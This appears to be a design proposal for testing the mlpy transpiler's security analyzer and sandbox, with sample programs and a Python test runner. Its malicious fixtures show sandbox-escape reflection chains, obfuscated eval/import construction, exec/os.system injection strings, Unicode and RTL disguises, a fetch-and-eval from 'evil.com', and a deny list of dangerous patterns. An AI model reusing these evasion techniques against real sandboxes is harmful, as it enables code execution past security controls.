# ML Test Programs Comprehensive Validation Suite

## Executive Summary

This proposal outlines a comprehensive testing framework to validate the mlpy v2.0 transpiler through real-world ML programs rather than isolated security component testing. The suite will test the complete pipeline: ML parsing → Security Analysis → Python Code Generation → Sandbox Execution.

## Problem Statement

**Current Gap:** Our security analysis components work well in isolation but lack validation through:
- Complex ML programs using all language features in nested combinations
- Malicious ML programs designed to evade security detection
- End-to-end pipeline validation (ML → Python → Execution)
- Real-world performance under realistic workloads

**Risk:** Production deployment without comprehensive integration testing could expose security vulnerabilities or correctness issues not caught by component-level tests.

## Proposed Solution

### Test Suite Architecture

```
tests/
├── ml_integration/
│   ├── legitimate_programs/          # Complex but safe ML programs
│   ├── malicious_programs/           # Security evasion attempts
│   ├── edge_cases/                   # Parser and analyzer stress tests
│   ├── language_coverage/            # Complete ML language feature coverage
│   └── performance_benchmarks/       # Real-world performance validation
├── test_runner.py                    # Comprehensive integration test runner
├── test_validator.py                 # Generated Python code validation
├── security_validator.py             # Security analysis validation
└── report_generator.py               # Detailed test reporting
```

## Detailed Implementation Plan

### Phase 1: ML Language Coverage Test Programs (Week 1-2)

#### 1.1 Basic Language Features
**File: `language_coverage/basic_features.ml`**
```ml
// Variables and basic types
let number = 42;
let text = "Hello World";
let boolean = true;
let array = [1, 2, 3, 4, 5];

// Functions
function add(a, b) {
    return a + b;
}

function factorial(n) {
    if (n <= 1) {
        return 1;
    } else {
        return n * factorial(n - 1);
    }
}
```

#### 1.2 Advanced Control Flow
**File: `language_coverage/control_flow.ml`**
```ml
// Complex nested control structures
function processData(items) {
    let results = [];

    for (let i = 0; i < items.length; i++) {
        let item = items[i];

        if (item.type == "number") {
            if (item.value > 10) {
                while (item.value > 100) {
                    item.value = item.value / 2;
                }
                results.push(item.value * 2);
            } else {
                switch (item.subtype) {
                    case "integer":
                        results.push(Math.floor(item.value));
                        break;
                    case "float":
                        results.push(item.value.toFixed(2));
                        break;
                    default:
                        results.push(item.value);
                }
            }
        } else if (item.type == "string") {
            try {
                let processed = item.value.trim().toUpperCase();
                if (processed.length > 0) {
                    results.push(processed);
                }
            } catch (error) {
                console.log("Error processing string: " + error);
            }
        }
    }

    return results;
}
```

#### 1.3 Object-Oriented Programming
**File: `language_coverage/object_oriented.ml`**
```ml
// Class definitions with inheritance
class Animal {
    constructor(name, species) {
        this.name = name;
        this.species = species;
        this.energy = 100;
    }

    speak() {
        return this.name + " makes a sound";
    }

    move() {
        this.energy -= 10;
        return this.name + " moves";
    }

    static compareAnimals(animal1, animal2) {
        return animal1.energy - animal2.energy;
    }
}

class Dog extends Animal {
    constructor(name, breed) {
        super(name, "Canis lupus");
        this.breed = breed;
        this.loyalty = 100;
    }

    speak() {
        return this.name + " barks: Woof!";
    }

    fetch(item) {
        this.energy -= 15;
        this.loyalty += 5;
        return this.name + " fetches " + item;
    }
}

class Cat extends Animal {
    constructor(name, indoor) {
        super(name, "Felis catus");
        this.indoor = indoor;
        this.independence = 90;
    }

    speak() {
        return this.name + " meows: Meow!";
    }

    hunt() {
        if (!this.indoor) {
            this.energy -= 20;
            return this.name + " goes hunting";
        } else {
            return this.name + " stalks a toy mouse";
        }
    }
}

// Complex object interactions
function animalShelter() {
    let animals = [
        new Dog("Buddy", "Golden Retriever"),
        new Cat("Whiskers", true),
        new Dog("Max", "German Shepherd"),
        new Cat("Luna", false)
    ];

    // Method chaining and complex operations
    return animals
        .filter(animal => animal.energy > 50)
        .map(animal => {
            animal.speak();
            if (animal instanceof Dog) {
                animal.fetch("ball");
            } else if (animal instanceof Cat) {
                animal.hunt();
            }
            return animal;
        })
        .sort((a, b) => Animal.compareAnimals(a, b));
}
```

#### 1.4 Functional Programming Patterns
**File: `language_coverage/functional_programming.ml`**
```ml
// Higher-order functions and closures
function createMultiplier(factor) {
    return function(value) {
        return value * factor;
    };
}

function compose(f, g) {
    return function(x) {
        return f(g(x));
    };
}

// Complex functional operations
function dataProcessor() {
    let data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

    let double = createMultiplier(2);
    let square = x => x * x;
    let doubleAndSquare = compose(square, double);

    // Nested functional operations
    let result = data
        .filter(x => x % 2 === 0)
        .map(doubleAndSquare)
        .reduce((acc, val) => {
            if (val > 50) {
                return acc.concat([val]);
            } else {
                return acc;
            }
        }, [])
        .sort((a, b) => b - a);

    return result;
}

// Recursive functional patterns
function deepClone(obj) {
    if (typeof obj !== 'object' || obj === null) {
        return obj;
    }

    if (Array.isArray(obj)) {
        return obj.map(deepClone);
    }

    let cloned = {};
    for (let key in obj) {
        cloned[key] = deepClone(obj[key]);
    }

    return cloned;
}
```

### Phase 2: Malicious ML Programs (Week 2-3)

#### 2.1 Reflection Evasion Attacks
**File: `malicious_programs/reflection_evasion.ml`**
```ml
// Obfuscated reflection through string construction
function getHiddenClass(obj) {
    let cls = "__cla" + "ss__";
    return obj[cls];
}

function accessBases(classObj) {
    let basesKey = "__ba";
    basesKey = basesKey + "ses__";
    return classObj[basesKey];
}

function buildSubclassCall() {
    let methodName = "__sub";
    methodName += "classes__";
    return methodName + "()";
}

// Dynamic property access chains
function chainedReflection(startObj) {
    let obj = startObj;
    let steps = ["__class__", "__bases__", "0", "__subclasses__"];

    for (let step of steps) {
        if (step === "0") {
            obj = obj[0];
        } else {
            obj = obj[step];
        }
    }

    return obj;
}

// Reflection through computed properties
function computedReflection(target) {
    let properties = {
        "class": "__" + "class" + "__",
        "bases": "__" + "bases" + "__",
        "dict": "__" + "dict" + "__",
        "mro": "__" + "mro" + "__"
    };

    let cls = target[properties.class];
    let bases = cls[properties.bases];
    let dict = cls[properties.dict];

    return {
        cls: cls,
        bases: bases,
        dict: dict
    };
}
```

#### 2.2 Import System Evasion
**File: `malicious_programs/import_evasion.ml`**
```ml
// Dynamic import name construction
function buildImportName() {
    let parts = ["__", "built", "in", "__"];
    return parts.join("");
}

function dynamicImport() {
    let moduleName = buildImportName();
    return import(moduleName);
}

// Import through indirection
function getImportFunction() {
    let importFunc = "__imp" + "ort__";
    return window[importFunc] || global[importFunc];
}

// Disguised dangerous imports
function loadUtilities() {
    let modules = [
        "os",
        "sys",
        "subprocess",
        "__builtin__"
    ];

    let loadedModules = {};

    for (let moduleName of modules) {
        try {
            // This should be caught by security analysis
            loadedModules[moduleName] = import(moduleName);
        } catch (e) {
            // Fallback attempts
            let altName = moduleName.replace("__", "");
            loadedModules[moduleName] = import(altName);
        }
    }

    return loadedModules;
}

// Obfuscated eval construction
function buildEvalFunction() {
    let evalName = "ev" + "al";
    let modules = loadUtilities();

    if (modules.__builtin__) {
        return modules.__builtin__[evalName];
    }

    return window[evalName] || global[evalName];
}
```

#### 2.3 Code Injection Through Template Construction
**File: `malicious_programs/code_injection.ml`**
```ml
// Template injection vulnerabilities
function processUserTemplate(userInput) {
    // This could inject arbitrary Python code
    let template = `
        def user_function():
            result = ${userInput}
            return result
    `;
    return template;
}

function buildDynamicCode(userCommands) {
    let code = "def process_data():\n";

    for (let command of userCommands) {
        // Potential injection point
        code += `    ${command}\n`;
    }

    code += "    return 'done'";
    return code;
}

// String interpolation injection
function formatCommand(userInput) {
    // Should detect this as dangerous
    return `exec("${userInput}")`;
}

// Indirect code construction
function buildExecutionString(operation, data) {
    let operations = {
        "evaluate": "eval",
        "execute": "exec",
        "compile": "compile"
    };

    let func = operations[operation];
    if (func) {
        return `${func}("${data}")`;
    }

    return data;
}

// Multi-stage code injection
function processWorkflow(steps) {
    let commands = [];

    for (let step of steps) {
        if (step.type === "eval") {
            commands.push(`eval("${step.code}")`);
        } else if (step.type === "system") {
            commands.push(`os.system("${step.command}")`);
        } else if (step.type === "import") {
            commands.push(`__import__("${step.module}")`);
        }
    }

    return commands.join("\n");
}
```

#### 2.4 Data Flow Evasion
**File: `malicious_programs/data_flow_evasion.ml`**
```ml
// Complex taint propagation paths
function processNetworkData() {
    let url = "http://evil.com/payload";
    let response = fetch(url);
    let data = response.text();

    // Multi-step taint propagation
    let processed = data.trim();
    let cleaned = processed.replace(/[^a-zA-Z0-9]/g, "");
    let encoded = btoa(cleaned);
    let decoded = atob(encoded);

    // Should detect this taint flow
    return eval(decoded);
}

function indirectTaintPropagation(userInput) {
    let container = {
        data: userInput,
        metadata: {
            source: "user",
            processed: false
        }
    };

    // Taint through object property access
    let extracted = container.data;
    let transformed = extracted.toUpperCase();

    // Should detect this as tainted
    return exec(transformed);
}

// File-based taint propagation
function processConfigFile(filename) {
    let content = readFile(filename);
    let config = JSON.parse(content);

    // Taint through configuration
    if (config.enableDynamic) {
        let command = config.dynamicCommand;
        return eval(command);
    }

    return config;
}

// Callback-based taint propagation
function processAsyncData(callback) {
    fetchUserData((userData) => {
        let processed = userData.command;

        // Taint through callback parameter
        callback(processed);
    });
}

function dangerousCallback(command) {
    // Should detect taint from async source
    return system(command);
}
```

### Phase 3: Edge Cases and Stress Tests (Week 3)

#### 3.1 Deeply Nested Structures
**File: `edge_cases/deep_nesting.ml`**
```ml
// Extremely deep nesting to test parser limits
function createDeepStructure(depth) {
    if (depth <= 0) {
        return {
            value: "base",
            level: 0
        };
    }

    return {
        value: "level_" + depth,
        level: depth,
        nested: createDeepStructure(depth - 1),
        operations: {
            transform: function(data) {
                if (depth > 50) {
                    return eval(data); // Hidden deep in nesting
                }
                return data;
            },
            process: {
                handler: function(input) {
                    if (typeof input === "string") {
                        return createDeepStructure(depth - 5);
                    }
                    return input;
                }
            }
        }
    };
}

// Deep function call chains
function chainedCalls(n) {
    if (n <= 0) {
        return "done";
    }

    return processLevel(
        transformData(
            validateInput(
                sanitizeData(
                    chainedCalls(n - 1)
                )
            )
        )
    );
}

function processLevel(data) {
    if (data.includes("system")) {
        // Hidden in deep call chain
        return exec(data);
    }
    return data;
}
```

#### 3.2 Unicode and Encoding Attacks
**File: `edge_cases/unicode_attacks.ml`**
```ml
// Unicode normalization attacks
function processUnicodeInput(input) {
    // Different Unicode representations of "eval"
    let variants = [
        "eval",           // Normal
        "е𝗏аl",           // Cyrillic/mathematical
        "ⅇval",           // Mathematical script
        "𝚎𝚟𝚊𝚕"           // Mathematical monospace
    ];

    for (let variant of variants) {
        if (input.includes(variant)) {
            // Should detect regardless of Unicode encoding
            return dangerous_function(input);
        }
    }

    return input;
}

// Zero-width character attacks
function hiddenCharacters() {
    // Contains zero-width characters to hide malicious code
    let command = "eval\u200B(\u200C\"malicious\u200D\"\u2060)";
    return command;
}

// Right-to-left override attacks
function rtlOverride() {
    // Uses RTL override to disguise code
    let disguised = "safe_function\u202E)(gnirts_suoicilam(\u202Deval";
    return disguised;
}
```

### Phase 4: Integration Test Runner Implementation

#### 4.1 Main Test Runner
**File: `test_runner.py`**
```python
#!/usr/bin/env python3
"""Comprehensive ML Integration Test Runner."""

import os
import sys
import time
import json
from typing import List, Dict, Any, Tuple
from pathlib import Path
from dataclasses import dataclass, asdict
from enum import Enum

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from mlpy.ml.transpiler import MLTranspiler
from mlpy.ml.analysis.parallel_analyzer import ParallelSecurityAnalyzer
from mlpy.runtime.sandbox.sandbox import MLSandbox, SandboxConfig


class TestResult(Enum):
    PASS = "PASS"
    FAIL = "FAIL"
    SKIP = "SKIP"
    ERROR = "ERROR"


@dataclass
class TestCase:
    name: str
    file_path: str
    category: str
    expected_threats: int
    should_transpile: bool
    should_execute: bool
    description: str


@dataclass
class TestExecutionResult:
    test_case: TestCase
    result: TestResult
    execution_time_ms: float
    security_analysis: Dict[str, Any] = None
    transpilation_result: Tuple[str, List, Dict] = None
    execution_result: Any = None
    error_message: str = None
    threat_count: int = 0


class MLIntegrationTestRunner:
    """Comprehensive integration test runner for ML programs."""

    def __init__(self, test_directory: str):
        self.test_directory = Path(test_directory)
        self.transpiler = MLTranspiler()
        self.security_analyzer = ParallelSecurityAnalyzer(max_workers=3)
        self.results: List[TestExecutionResult] = []

        # Test categories and their properties
        self.test_categories = {
            'legitimate_programs': {
                'expected_threats': 0,
                'should_transpile': True,
                'should_execute': True
            },
            'malicious_programs': {
                'expected_threats_min': 1,
                'should_transpile': False,  # Should be blocked
                'should_execute': False
            },
            'edge_cases': {
                'expected_threats': 0,
                'should_transpile': True,
                'should_execute': True
            },
            'language_coverage': {
                'expected_threats': 0,
                'should_transpile': True,
                'should_execute': True
            }
        }

    def discover_test_cases(self) -> List[TestCase]:
        """Discover all ML test files."""
        test_cases = []

        for category_dir in self.test_directory.iterdir():
            if not category_dir.is_dir():
                continue

            category = category_dir.name
            if category not in self.test_categories:
                continue

            category_config = self.test_categories[category]

            for ml_file in category_dir.glob("*.ml"):
                test_case = TestCase(
                    name=f"{category}::{ml_file.stem}",
                    file_path=str(ml_file),
                    category=category,
                    expected_threats=category_config.get('expected_threats', 0),
                    should_transpile=category_config.get('should_transpile', True),
                    should_execute=category_config.get('should_execute', True),
                    description=self._extract_description(ml_file)
                )
                test_cases.append(test_case)

        return sorted(test_cases, key=lambda tc: tc.name)

    def _extract_description(self, ml_file: Path) -> str:
        """Extract description from ML file comments."""
        try:
            with open(ml_file, 'r', encoding='utf-8') as f:
                first_line = f.readline().strip()
                if first_line.startswith('//'):
                    return first_line[2:].strip()
        except:
            pass
        return f"ML test program: {ml_file.name}"

    def run_single_test(self, test_case: TestCase) -> TestExecutionResult:
        """Run a single ML test case through the complete pipeline."""
        print(f"  Running {test_case.name}...")

        start_time = time.time()
        result = TestExecutionResult(
            test_case=test_case,
            result=TestResult.ERROR,  # Default to ERROR, will be updated
            execution_time_ms=0.0
        )

        try:
            # Step 1: Load ML source code
            with open(test_case.file_path, 'r', encoding='utf-8') as f:
                ml_source = f.read()

            # Step 2: Security Analysis
            security_result = self.security_analyzer.analyze_parallel(
                ml_source, test_case.file_path
            )

            threat_count = (
                len(security_result.pattern_matches) +
                len(security_result.ast_violations) +
                len(security_result.data_flow_results.get('violations', []))
            )

            result.security_analysis = {
                'pattern_matches': len(security_result.pattern_matches),
                'ast_violations': len(security_result.ast_violations),
                'data_flow_violations': len(security_result.data_flow_results.get('violations', [])),
                'total_threats': threat_count,
                'analysis_time_ms': security_result.analysis_time * 1000
            }
            result.threat_count = threat_count

            # Step 3: Validate Security Analysis Results
            if test_case.category == 'malicious_programs':
                if threat_count == 0:
                    result.result = TestResult.FAIL
                    result.error_message = f"Expected threats but found none (should detect malicious code)"
                    return result
            elif test_case.category in ['legitimate_programs', 'language_coverage', 'edge_cases']:
                if threat_count > 0:
                    result.result = TestResult.FAIL
                    result.error_message = f"Unexpected threats detected in legitimate code: {threat_count}"
                    return result

            # Step 4: Transpilation (only if should transpile)
            if test_case.should_transpile:
                try:
                    python_code, issues, source_map = self.transpiler.transpile_to_python(
                        ml_source, generate_source_maps=True
                    )

                    result.transpilation_result = (python_code, issues, source_map)

                    # Validate transpilation didn't introduce security issues
                    if self._validate_generated_python(python_code):
                        if test_case.should_execute:
                            # Step 5: Sandbox Execution
                            exec_result = self._execute_in_sandbox(python_code)
                            result.execution_result = exec_result

                        result.result = TestResult.PASS
                    else:
                        result.result = TestResult.FAIL
                        result.error_message = "Generated Python code contains security issues"

                except Exception as e:
                    if test_case.category == 'malicious_programs':
                        # Malicious programs should fail transpilation
                        result.result = TestResult.PASS
                        result.error_message = f"Correctly blocked malicious program: {e}"
                    else:
                        result.result = TestResult.FAIL
                        result.error_message = f"Transpilation failed: {e}"
            else:
                # For malicious programs that shouldn't transpile
                result.result = TestResult.PASS

        except Exception as e:
            result.result = TestResult.ERROR
            result.error_message = f"Test execution error: {e}"

        finally:
            result.execution_time_ms = (time.time() - start_time) * 1000

        return result

    def _validate_generated_python(self, python_code: str) -> bool:
        """Validate that generated Python code is safe."""
        # Quick security check on generated Python
        dangerous_patterns = [
            'eval(', 'exec(', '__import__', 'getattr(', 'setattr(',
            '__class__.__bases__', '__subclasses__', 'subprocess.',
            'os.system', 'open(', '__builtin__'
        ]

        code_lower = python_code.lower()
        for pattern in dangerous_patterns:
            if pattern.lower() in code_lower:
                return False

        return True

    def _execute_in_sandbox(self, python_code: str) -> Dict[str, Any]:
        """Execute Python code in sandbox and return results."""
        try:
            config = SandboxConfig(
                cpu_timeout=5.0,
                memory_limit=64 * 1024 * 1024,  # 64MB
                allowed_imports=['math', 'json'],
                enable_networking=False
            )

            sandbox = MLSandbox(config)
            result = sandbox.execute_code(python_code)

            return {
                'success': True,
                'result': result,
                'stdout': getattr(result, 'stdout', ''),
                'stderr': getattr(result, 'stderr', '')
            }

        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }

    def run_all_tests(self) -> Dict[str, Any]:
        """Run all discovered test cases."""
        print("="*70)
        print("ML INTEGRATION TEST SUITE")
        print("="*70)

        test_cases = self.discover_test_cases()
        print(f"Discovered {len(test_cases)} test cases across {len(self.test_categories)} categories")

        # Run tests by category
        category_results = {}

        for category in self.test_categories.keys():
            category_tests = [tc for tc in test_cases if tc.category == category]
            if not category_tests:
                continue

            print(f"\n[{category.upper()}] Running {len(category_tests)} tests...")
            category_results[category] = []

            for test_case in category_tests:
                test_result = self.run_single_test(test_case)
                self.results.append(test_result)
                category_results[category].append(test_result)

                # Print immediate result
                status = test_result.result.value
                time_ms = test_result.execution_time_ms
                threats = test_result.threat_count

                if test_result.result == TestResult.PASS:
                    print(f"    ✓ {test_case.name} ({time_ms:.1f}ms, {threats} threats)")
                else:
                    print(f"    ✗ {test_case.name} ({time_ms:.1f}ms) - {test_result.error_message}")

        # Generate comprehensive report
        return self._generate_report(category_results)

    def _generate_report(self, category_results: Dict[str, List[TestExecutionResult]]) -> Dict[str, Any]:
        """Generate comprehensive test report."""
        print("\n" + "="*70)
        print("TEST EXECUTION REPORT")
        print("="*70)

        total_tests = len(self.results)
        passed_tests = len([r for r in self.results if r.result == TestResult.PASS])
        failed_tests = len([r for r in self.results if r.result == TestResult.FAIL])
        error_tests = len([r for r in self.results if r.result == TestResult.ERROR])

        total_time = sum(r.execution_time_ms for r in self.results)
        avg_time = total_time / total_tests if total_tests > 0 else 0

        print(f"Total Tests: {total_tests}")
        print(f"Passed: {passed_tests} ({passed_tests/total_tests*100:.1f}%)")
        print(f"Failed: {failed_tests} ({failed_tests/total_tests*100:.1f}%)")
        print(f"Errors: {error_tests} ({error_tests/total_tests*100:.1f}%)")
        print(f"Total Execution Time: {total_time:.1f}ms")
        print(f"Average Test Time: {avg_time:.1f}ms")

        # Category breakdown
        print(f"\nCategory Breakdown:")
        for category, results in category_results.items():
            cat_passed = len([r for r in results if r.result == TestResult.PASS])
            cat_total = len(results)
            print(f"  {category}: {cat_passed}/{cat_total} ({cat_passed/cat_total*100:.1f}%)")

        # Failed tests details
        failed_results = [r for r in self.results if r.result != TestResult.PASS]
        if failed_results:
            print(f"\nFailed/Error Tests:")
            for result in failed_results:
                print(f"  ✗ {result.test_case.name}: {result.error_message}")

        # Security analysis summary
        total_threats = sum(r.threat_count for r in self.results)
        malicious_results = [r for r in self.results if r.test_case.category == 'malicious_programs']
        detected_malicious = len([r for r in malicious_results if r.threat_count > 0])

        print(f"\nSecurity Analysis Summary:")
        print(f"  Total Threats Detected: {total_threats}")
        print(f"  Malicious Programs Detected: {detected_malicious}/{len(malicious_results)} ({detected_malicious/len(malicious_results)*100:.1f}%)")

        # Overall assessment
        success_rate = passed_tests / total_tests
        if success_rate >= 0.95:
            status = "EXCELLENT"
        elif success_rate >= 0.90:
            status = "GOOD"
        elif success_rate >= 0.80:
            status = "ACCEPTABLE"
        else:
            status = "NEEDS_WORK"

        print(f"\nOverall Status: {status} ({success_rate*100:.1f}% success rate)")
        print("="*70)

        return {
            'summary': {
                'total_tests': total_tests,
                'passed': passed_tests,
                'failed': failed_tests,
                'errors': error_tests,
                'success_rate': success_rate,
                'total_time_ms': total_time,
                'avg_time_ms': avg_time,
                'status': status
            },
            'categories': {
                cat: {
                    'total': len(results),
                    'passed': len([r for r in results if r.result == TestResult.PASS]),
                    'failed': len([r for r in results if r.result == TestResult.FAIL]),
                    'errors': len([r for r in results if r.result == TestResult.ERROR])
                }
                for cat, results in category_results.items()
            },
            'security_analysis': {
                'total_threats': total_threats,
                'malicious_detected': detected_malicious,
                'malicious_total': len(malicious_results)
            },
            'detailed_results': [asdict(result) for result in self.results]
        }


def main():
    """Run ML integration test suite."""
    test_directory = os.path.join(os.path.dirname(__file__), 'ml_integration')

    if not os.path.exists(test_directory):
        print(f"Test directory not found: {test_directory}")
        print("Please create the test directory structure and ML test programs.")
        return 1

    runner = MLIntegrationTestRunner(test_directory)

    try:
        report = runner.run_all_tests()

        # Save detailed report
        with open('ml_integration_test_report.json', 'w') as f:
            json.dump(report, f, indent=2, default=str)

        print(f"\nDetailed report saved to: ml_integration_test_report.json")

        # Return exit code based on success rate
        success_rate = report['summary']['success_rate']
        return 0 if success_rate >= 0.90 else 1

    except Exception as e:
        print(f"Test suite execution failed: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
```

### Phase 5: Execution and Reporting Plan

#### 5.1 Test Execution Workflow
1. **Discovery Phase**: Automatically discover all `.ml` files in test directories
2. **Security Analysis**: Run parallel security analysis on each ML program
3. **Transpilation**: Attempt to transpile ML to Python (expected to fail for malicious programs)
4. **Python Validation**: Check generated Python code for security issues
5. **Sandbox Execution**: Execute safe Python code in isolated sandbox
6. **Result Aggregation**: Collect all results and generate comprehensive report

#### 5.2 Success Criteria
- **Legitimate Programs**: 100% should transpile and execute successfully with 0 security threats
- **Malicious Programs**: 100% should be detected with >0 security threats, transpilation should fail
- **Edge Cases**: Should handle gracefully without crashing, may have performance implications
- **Language Coverage**: All ML language features should transpile correctly

#### 5.3 Report Generation
- **JSON Report**: Detailed machine-readable results for CI integration
- **Console Report**: Human-readable summary with pass/fail status
- **Performance Metrics**: Execution times, memory usage, threat detection rates
- **Security Analysis**: Comprehensive breakdown of detected threats by category

## Implementation Timeline

**Week 1**: Create basic language coverage test programs (30+ files)
**Week 2**: Develop malicious ML programs with evasion techniques (20+ files)
**Week 3**: Build edge cases and stress tests (15+ files)
**Week 4**: Implement comprehensive test runner with reporting
**Week 5**: Integration testing, debugging, and validation

## Expected Outcomes

1. **Real Integration Validation**: Test the complete ML→Python pipeline under realistic conditions
2. **Security Evasion Detection**: Validate our security analysis against sophisticated attack attempts
3. **Language Feature Coverage**: Ensure all ML language features work correctly in complex combinations
4. **Performance Under Load**: Understand real-world performance characteristics
5. **Production Readiness Assessment**: Comprehensive validation before deployment

## Conclusion

This comprehensive ML test suite will provide the rigorous validation currently missing from our Sprint 5 work. Rather than isolated component testing, we'll validate the complete transpiler pipeline with realistic programs, sophisticated security evasion attempts, and complex language feature combinations.

The investment in creating 65+ comprehensive ML test programs will pay dividends in:
- Confidence in production deployment
- Early detection of integration issues
- Comprehensive security validation
- Performance optimization opportunities
- Complete language feature validation

This is the proper engineering validation our security analysis engine needs before production deployment.